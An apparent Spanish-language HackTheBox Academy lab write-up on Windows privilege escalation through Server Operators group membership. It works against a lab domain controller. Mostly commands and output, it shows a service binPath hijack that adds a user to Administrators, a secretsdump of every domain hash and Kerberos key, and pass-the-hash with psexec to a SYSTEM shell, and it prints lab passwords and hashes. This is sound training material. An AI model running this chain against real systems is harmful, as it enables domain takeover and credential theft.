
# Server Operators

El grupo [Operadores de servidores](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) permite a los miembros administrar servidores Windows sin necesidad de que se les asignen privilegios de administrador de dominio. Es un grupo con muchos privilegios que puede iniciar sesión localmente en servidores, incluidos los controladores de dominio.

La pertenencia a este grupo confiere poder `SeBackupPrivilege`y `SeRestorePrivilege`privilegios y la capacidad de controlar los servicios locales.

### **Consulta del servicio AppReadiness**

Examinemos el servicio `AppReadiness`. Podemos confirmar que este servicio se inicia como SYSTEM mediante la utilidad `sc.exe`.

```powershell
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

### **Comprobación de permisos de servicio con PsService**

Podemos utilizar el visor/controlador de servicios [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) , que es parte de la suite Sysinternals, para verificar los permisos del servicio. `PsService` funciona de manera muy similar a la utilidad `sc` y puede mostrar el estado y las configuraciones del servicio y también le permite iniciar, detener, pausar, reanudar y reiniciar servicios tanto localmente como en hosts remotos.

```powershell
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

Esto confirma que el grupo `Server Operators` tiene el derecho de acceso [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) , lo que nos da control total sobre este servicio.

### **Comprobar la pertenencia al grupo de administradores locales**

Echemos un vistazo a los miembros actuales del grupo de administradores locales y confirmemos que nuestra cuenta de destino no está presente.

```powershell
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

### **Modificación de la ruta binaria del servicio**

Cambiemos la ruta binaria para ejecutar un comando que agregue nuestro usuario actual al grupo de administradores locales predeterminado.

```powershell
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

### **Iniciando el servicio**

El inicio del servicio falla, lo cual es lo esperado.

```powershell
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

### **Confirmar la membresía del grupo de administradores locales**

Si verificamos la membresía del grupo de administradores, vemos que el comando se ejecutó exitosamente.

```powershell
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

### **Confirmar el acceso de administrador local en el controlador de dominio**

Desde aquí, tenemos control total sobre el controlador de dominio y podemos recuperar todas las credenciales de la base de datos NTDS y acceder a otros sistemas y realizar tareas posteriores a la explotación.

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

### **Extracción de hashes NTLM del controlador de dominio**

```shell-session
afsh4ck@kali$ impacket-secretsdump server_adm@10.129.43.9 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.43 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "server_adm" y la contraseña "HTB_@cademy_stdnt!"
```

> Escale los privilegios utilizando los métodos que se muestran en esta sección y envíe el contenido de la flag ubicada en `c:\Users\Administrator\Desktop\ServerOperators\flag.txt`

### Herramientas

```powershell
PS C:\tools> ls

    Directory: C:\tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   4:06 PM                DSInternals
-a----        5/21/2021  10:18 AM           5120 adduser.dll
-a----         5/6/2021   5:53 PM       16777216 ntds.dit
-a----        6/28/2016  10:43 AM         188584 PsService.exe
-a----         5/6/2021  12:55 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----         5/6/2021  12:54 PM          16384 SeBackupPrivilegeUtils.dll
-a----        6/11/2004   3:33 PM         290304 subinacl.exe
-a----         5/6/2021   5:54 PM       16236544 SYSTEM
```

#### Comprobación de permisos de servicio con PsService

Esto confirma que el grupo `Server Operators` tiene el derecho de acceso [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) , lo que nos da control total sobre este servicio.

```powershell
PS C:\tools> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

#### Comprobación de administradores locales

Al comprobar los administradores locales vemos que el usuario `server_adm` no está en el grupo Administrators:

```powershell
PS C:\tools> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

#### Modificación de la ruta binaria del servicio

Desde una CMD ejecutamos lo siguiente:

```powershell
C:\Users\server_adm> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
[SC] ChangeServiceConfig SUCCESS
```

#### Iniciar el servicio

El inicio del servicio falla, lo cual es lo esperado.

```powershell
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

#### Confirmar la membresía del grupo de administradores locales

Vemos que ya estamos dentro del grupo de administradores locales.

```powershell
C:\Users\server_adm> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

En este punto podríamos acceder al Domain Controller y extraer todos los hashes de los usuarios de Active Directory, lo que nos daría la contraseña del usuario Administrator (que necesitamos para acceder a la flag).

Un escaneo de Nmap nos confirma que la máquina en la que estamos es el Controlador de Dominio:

```shell-session
afsh4ck@kali$ sudo nmap -v -A -sCV -T5 10.129.162.0/24

Nmap scan report for 10.129.162.164
Host is up (0.042s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-21 16:27:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: WINLPE-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: WINLPE-DC01.INLANEFREIGHT.LOCAL
```

#### Confirmación de acceso como administrador en el DC

```shell-session
afsh4ck@kali$ netexec smb 10.129.162.164 -u server_adm -p 'HTB_@cademy_stdnt!'
SMB         10.129.162.164  445    WINLPE-DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.162.164  445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

Bingo! Vamos a por los hashes.

#### Extracción de hashes NTLM del DC

```shell-session
afsh4ck@kali$ impacket-secretsdump -just-dc server_adm:"HTB_@cademy_stdnt\!"@10.129.162.164

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
server_adm:1108:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
netadm:1109:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
logger:1110:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2a45a50a891b5ce8d3110653bece20c7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f220c24907b50fe1666a8227013389f60c775440806853065f80d9ecbe5a4a18
Administrator:aes128-cts-hmac-sha1-96:9f9f3c7d7a4db1dc88197c0b00b444f9
Administrator:des-cbc-md5:a7fe6bceb9975107
krbtgt:aes256-cts-hmac-sha1-96:561745704448a32cb5d7755e87063a126d8061605d19302dbf6182801594a4b1
krbtgt:aes128-cts-hmac-sha1-96:f98f8b9da297e621771c2f7eb8f74ce3
krbtgt:des-cbc-md5:62ba328fa75e8ab0
htb-student:aes256-cts-hmac-sha1-96:34bb4aad96edfa4e415c18a7349d79e844e9a77e82cfa0f895cbb77232f2d5f2
htb-student:aes128-cts-hmac-sha1-96:7942e154d896dcee69a5e1157d3f1049
htb-student:des-cbc-md5:85255bf1da9b8ff1
svc_backup:aes256-cts-hmac-sha1-96:c6edc088546c2c3589489519606b85620263dbaa80802491f4eee870c06202f6
svc_backup:aes128-cts-hmac-sha1-96:af521a84ab7773e24480e1f9b90b1bd7
svc_backup:des-cbc-md5:152fb5971f25c8f4
bob:aes256-cts-hmac-sha1-96:f7a760ec47ffaf2d63e5dae23c70f33191e4c7390820298a4ff29ad200cc2f6c
bob:aes128-cts-hmac-sha1-96:0229e9d9787bbae2249b775c2d623a1c
bob:des-cbc-md5:61029d79dfd389a2
hyperv_adm:aes256-cts-hmac-sha1-96:b7620e2a6b3d7a5663ef3b54bd508481232fe0205248628bb032fb5d69c134c9
hyperv_adm:aes128-cts-hmac-sha1-96:e54b90a25cf52f236a4aa667cf8f51fb
hyperv_adm:des-cbc-md5:5e2f9e8080c40819
printsvc:aes256-cts-hmac-sha1-96:f61791439192f8e3cd2a824248678b7ef3245e81a4ab8b5360cf5de91d34a440
printsvc:aes128-cts-hmac-sha1-96:0acc1b2b04d8912f2395106349c1c186
printsvc:des-cbc-md5:3e8a5ba7a76262cb
server_adm:aes256-cts-hmac-sha1-96:4e18a61547914e1f0bf29623ae1a18f8898a9d8939b36541c21a68d4561c96c0
server_adm:aes128-cts-hmac-sha1-96:d0279a168af61ac1979f4b6dd41a91bb
server_adm:des-cbc-md5:e3e6dcf4753886e9
netadm:aes256-cts-hmac-sha1-96:a73fcce0ceeeb1976019a0eddbaa8f710df96b92dbbf0c4e65d9d56a24ddbbd0
netadm:aes128-cts-hmac-sha1-96:5a78f660b2f6791794ae1cebd2b4238c
netadm:des-cbc-md5:0d76a40bf89b79da
logger:aes256-cts-hmac-sha1-96:d3e3efdb8980b8754739f0fed541dd7db3dd96862ffb4ebade3b2e9bd3287f41
logger:aes128-cts-hmac-sha1-96:6184c8de58a794ae380975884b66f5cb
logger:des-cbc-md5:b9c85b5720b3589b
WINLPE-DC01$:aes256-cts-hmac-sha1-96:d5faebb4cee9135a0388db281ebfc5d1e54f450e9655c77abfae6bff49a07acf
WINLPE-DC01$:aes128-cts-hmac-sha1-96:4b67d661f8dd3337db984db86443e39f
WINLPE-DC01$:des-cbc-md5:c797da7cab3e701a
[*] Cleaning up... 
```

Buuuum! Obtenemos todos los hashes de los usuarios de Active Directory. También podríamos hacer el volcado del usuario Administrator (más dirigido):

```shell-session
afsh4ck@kali$ impacket-secretsdump server_adm@10.129.162.164 -just-dc-user administrator

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f220c24907b50fe1666a8227013389f60c775440806853065f80d9ecbe5a4a18
Administrator:aes128-cts-hmac-sha1-96:9f9f3c7d7a4db1dc88197c0b00b444f9
Administrator:des-cbc-md5:a7fe6bceb9975107
[*] Cleaning up... 
```

#### Acceso a la flag

Con el hash del usuario administrator vamos a hacer un `Pass the Hash` para acceder a través de RDP:

```
xfreerdp /v:10.129.162.164 /u:administrator /pth:7796ee39fd3a9c3a1844556115ae1a54
```

Al intentar acceder por Pass the Hash nos salta este mensaje:

<figure><img src="/files/kKqRxNvUxD77dovBrpLn" alt=""><figcaption></figcaption></figure>

{% content-ref url="/pages/mRPaPsEGLLIoMSmu8WjJ" %}
[Ataques a RDP](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/atacando-servicios-comunes/ataques-a-rdp.md)
{% endcontent-ref %}

Es un mensaje típico de seguridad al intentar hacer un Pass the Hash, ya que no proporcionamos ninguna contraseña. Para evitar esto vamos a loguearnos de nuevo con el usuario `server_adm`.

Vamos a habilitarlo agregando una nueva clave de registro `DisableRestrictedAdmin`(REG\_DWORD) en `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.

Se puede hacer usando el siguiente comando:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

A pesar de ser Administrador no podemos ejecutarlo, por lo que no podemos hacer Pass the Hash:

```
C:\Users\server_adm>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
ERROR: Access is denied.
```

#### Impacket-PsExec

Si la técnica anterior falla podemos hacer el Pass the Hash con PsExec para ganar una shell:

```shell-session
afsh4ck@kali$ impacket-psexec -hashes :7796ee39fd3a9c3a1844556115ae1a54 administrator@10.129.162.164 cmd
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.162.164.....
[*] Found writable share ADMIN$
[*] Uploading file MqPDHfSA.exe
[*] Opening SVCManager on 10.129.162.164.....
[*] Creating service LVBE on 10.129.162.164.....
[*] Starting service LVBE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

#### Acceso a la flag

```powershell
C:\Windows\system32> type c:\Users\Administrator\Desktop\ServerOperators\flag.txt
S3rver_0perators_@ll_************
```
